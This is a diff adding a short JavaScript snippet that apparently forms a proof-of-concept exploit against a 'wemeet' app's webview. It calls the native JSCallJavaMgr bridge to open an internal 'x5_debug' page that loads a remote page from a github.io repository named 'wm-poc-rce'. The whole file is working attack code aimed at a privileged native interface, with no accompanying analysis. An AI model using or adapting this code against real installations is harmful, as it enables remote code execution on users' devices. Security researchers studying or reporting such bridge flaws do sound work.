@@ -1,0 +1,12 @@
+(function(){
+  window.__p108cb=function(){};
+  if(!window.JSCallJavaMgr){document.title='P108-NO-TM-BRIDGE';return}
+  setTimeout(function(){
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__p108cb',module:'CommonPlugin',method:'OpenNewPage',callId:'P108X5',
+      param:{scheme:'wemeet://page/profile/aboutus/x5_debug',router_params:{
+        url:'https://gitwhs.github.io/wm-poc-rce/p108x5.html',from_webView:true
+      }}
+    }));
+  },800);
+})();
